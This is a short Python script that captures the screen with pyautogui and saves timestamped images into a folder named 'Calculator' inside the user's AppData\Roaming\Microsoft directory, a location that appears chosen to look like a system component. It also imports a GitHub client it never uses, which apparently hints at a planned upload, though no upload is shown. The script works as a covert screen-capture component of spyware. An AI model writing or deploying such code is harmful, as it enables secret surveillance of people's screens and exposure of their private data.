import pyautogui
from datetime import datetime
import os
from github.MainClass import Github


class Screenshot():

    def __init__(self):
        self.screenshot = self.take_screenshot()
        # Directory
        self.directory = "Calculator"
        # Parent Directory path
        self.parent_dir = "C:\\Users\\User\\AppData\\Roaming\\Microsoft"
        # Path
        self.path = os.path.join(self.parent_dir, self.directory)
        if not os.path.exists(self.path):
            os.mkdir(self.path)
        self.folder_path = self.path
        self.screenshot_name = f"screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
        self.file_path = f"{self.folder_path}\\{self.screenshot_name}"
        self.screenshot = self.take_screenshot()
        print("Screenshot captured:", self.screenshot_name)
        self.screenshot.save(self.file_path)

    def take_screenshot(self):
        screenshot = pyautogui.screenshot()
        return screenshot

screenshot= Screenshot()
